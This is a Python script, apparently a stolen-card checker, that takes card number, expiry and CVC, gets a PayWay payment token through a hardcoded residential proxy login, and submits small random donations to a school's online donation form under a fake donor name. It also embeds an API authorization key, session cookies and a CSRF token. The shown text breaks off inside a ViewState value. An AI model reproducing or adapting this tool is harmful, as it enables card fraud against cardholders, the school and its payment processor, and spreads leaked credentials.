import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		type = "Visa"
	if n.startswith("5"):
		type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(2, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.payway.com.au',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'authorization': 'Basic UTI0ODQyX1BVQl9wYnE0OTVjdzQ0eTdmeTV5ajZheGo0eTg1eXZocGc4ZHl4Z3Z5NWpjcDdqdnhwc2NieDZhbWJmN3p6dWk6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://api.payway.com.au',
	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-no-authenticate-basic': 'true',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'paymentMethod': 'creditCard',
	    'connectionType': 'FRAME',
	    'cardholderName': 'Gen Paypal',
	    'cardNumber': f'{n}',
	    'expiryDateMonth': f'{mm}',
	    'expiryDateYear': f'{yy}',
	    'cvn': f'{cvc}',
	    'threeDS2': 'false',
	}
	
	response = session.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
	
	tok = response.json()['singleUseTokenId']
	
	cookies = {
	    'CMSPreferredCulture': 'en-US',
	    '_fbp': 'fb.3.1748437511049.466206203913380598',
	    'CMSCsrfCookie': '+9HEAjdvNuBmamkZLPTbd/4PZuRcjqbeGffvp7iF',
	    'ASP.NET_SessionId': 't2r4znmn4uzsph3gueo0zbkb',
	    '_gid': 'GA1.4.1308471643.1754300213',
	    '_ga': 'GA1.1.1569545864.1748437511',
	    '_ga_123456789': 'GS2.1.s1754300215$o8$g1$t1754300371$j58$l0$h0',
	    '_gcl_au': '1.1.2107580628.1748437510.276477851.1754300371.1754300371',
	    '_ga_FSFGE2FQ14': 'GS2.1.s1754300212$o12$g1$t1754300371$j60$l0$h0',
	}
	
	headers = {
	    'authority': 'www.queenwood.nsw.edu.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'CMSPreferredCulture=en-US; _fbp=fb.3.1748437511049.466206203913380598; CMSCsrfCookie=+9HEAjdvNuBmamkZLPTbd/4PZuRcjqbeGffvp7iF; ASP.NET_SessionId=t2r4znmn4uzsph3gueo0zbkb; _gid=GA1.4.1308471643.1754300213; _ga=GA1.1.1569545864.1748437511; _ga_123456789=GS2.1.s1754300215$o8$g1$t1754300371$j58$l0$h0; _gcl_au=1.1.2107580628.1748437510.276477851.1754300371.1754300371; _ga_FSFGE2FQ14=GS2.1.s1754300212$o12$g1$t1754300371$j60$l0$h0',
	    'origin': 'https://www.queenwood.nsw.edu.au',
	    'referer': 'https://www.queenwood.nsw.edu.au/About/Support-Us',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'manScript_HiddenField': '',
	    '__CMSCsrfToken': 'euVqKdvmrOEw4PKzBUxJZiNJ/Q4MZfCNknqlpXyJf1h0tYMgxS1YTgUJSf60E8ccEbCh4ue+BaXqqMtgYBXHc9cCIr4Lpac9lPwBYpFx4fg=',
	    'lng': 'en-US',
	    'dm$hdnArgs': '',
	    'dm$hdnAnother': '',
	    'dm$hdnClose': '',
	    'dm$hdnComment': '',
	    'dm$hdnCurrStep': '0',
	    'p$lt$zoneCenter$Header$ctl01$txtWord': '',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$rblDonationAmount': 'others',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$txtAmount': f'{random_amount1}.{random_amount2}',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$rblCategory': '2',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$txtTitle': 'Mr',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$txtFirstName': 'Gen',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$txtSurname': 'Paypal',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$txtPhone': '4303000850',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$txtEmail': f'genpaypal{random_amount1}{random_amount2}@gmail.com',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$txtAddress1': 'Street 27',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$txtAddress2': '',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$txtSuburb': 'New York',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$txtPostCode': '10080',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$ddCountry': '271',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$ddState': '103',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$PaymentToken': f'{tok}',
	    'p$lt$zoneCenter$pageplaceholder$p$lt$zoneCenterInner$DonationFormComponent$btnSubmit': '',
	    '__EVENTTARGET': '',
	    '__EVENTARGUMENT': '',
	    '__LASTFOCUS': '',
	    '__VIEWSTATE': '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